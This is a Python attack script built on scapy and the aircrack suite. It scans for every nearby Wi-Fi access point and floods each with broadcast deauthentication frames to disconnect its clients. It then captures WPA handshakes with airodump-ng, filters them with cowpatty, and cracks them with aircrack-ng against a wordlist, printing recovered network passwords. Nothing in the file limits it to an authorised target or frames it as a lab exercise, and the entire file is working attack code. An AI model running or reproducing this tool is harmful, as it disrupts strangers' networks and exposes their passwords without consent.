#! /usr/bin/env python3
from scapy.all import *
from threading import Thread
from sys import argv
from os  import system
from time import sleep
from glob import glob
import subprocess

try:
	iface = argv[1]
	packet_count = int(argv[2])
except:
	print(argv[0],'<iface> <packet_count>')
	exit()

SUCCESS = '\033[92m'
INFO    = '\033[94m'
END     = '\033[0m'
WARNING = '\033[93m'
FAIL    = '\033[91m'

targets = []
scan = True

def channel_change():
	global scan
	while scan:
		for x in range(1,12):
			system('iwconfig {} channel {}'.format(iface,str(x)))
			sleep(0.1)
def PacketHandler(pkt) :
	if pkt.haslayer(Dot11) :
		if pkt.type == 0 and pkt.subtype == 8:

			channel = int( ord(pkt[Dot11Elt:3].info))
			bssid   = pkt.addr2

			if pkt.addr2+'-'+str(channel) not in targets:
				targets.append(pkt.addr2+'-'+str(channel))

def deauth_clients(AP):
	packet = RadioTap(present=0)/Dot11(type=0,subtype=12,addr1='ff:ff:ff:ff:ff:ff',
	addr2=AP,addr3=AP)/Dot11Deauth(reason=7)
	for x in range(64):
		sendp(packet,verbose=False)

print(INFO+'[!]Scanning for acesspoints...'+END)

Thread(target=channel_change).start()
sleep(1)
sniff(iface=iface, prn = PacketHandler,count=packet_count)
scan = False

if len(targets) <= 0:
	print(FAIL+'[-]No networks found'+END)
	exit(-1)
print(SUCCESS+'[+]Found {} networks'.format(str(len(targets)))+END)


for t in targets:
	bssid   = t.split('-')[0]
	channel = t.split('-')[1]
	system('iwconfig {} channel {}'.format(iface,channel))
	cmd = 'gnome-terminal -- timeout 30 airodump-ng --bssid {} -w {} -c {} {}'.format(bssid,bssid,channel,iface)
	print(cmd)
	Thread(target=deauth_clients,args=(bssid,)).start()
	system(cmd)
	sleep(30)


system('rm *.kismet.csv *.kismet.netxml *.csv')

handshakes = glob('./*.cap')

if len(handshakes) <= 0:
	print(FAIL+'[-]No handshakes captured')
	exit(-1)
print(SUCCESS+'[+]Captured {} handshakes'.format(str(len(handshakes)))+END)

print(INFO+'[!]Searching for valid handshakes...'+END)

valid_handshakes = []

for file in handshakes:
	child = subprocess.Popen(['cowpatty','-c','-r',file],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	child.wait()
	rc = child.returncode
	if rc == 0:
		valid_handshakes.append(file)
	else:
		system('rm '+file)

if len(valid_handshakes) <= 0:
	print(FAIL+'[-]No valid handshakes found'+END)


print(SUCCESS+'[+]Captured {} valid handshakes'.format(len(valid_handshakes))+END)

print(INFO+'[!]Cracking all valid handshakes...'+END)

for h in valid_handshakes:
	cmd = 'aircrack-ng -w ./wordlist {} > out'.format(h)
	print(cmd)
	system(cmd)
	results = open('out','r').read()
	if 'KEY FOUND!' in results:
		essid = results.split('Encryption')[1].split('Choosing')[0].strip().split(' ')[4].strip()
		key   = results.split('FOUND! [')[1].split(']')[0].strip()
		print(essid,':',key)
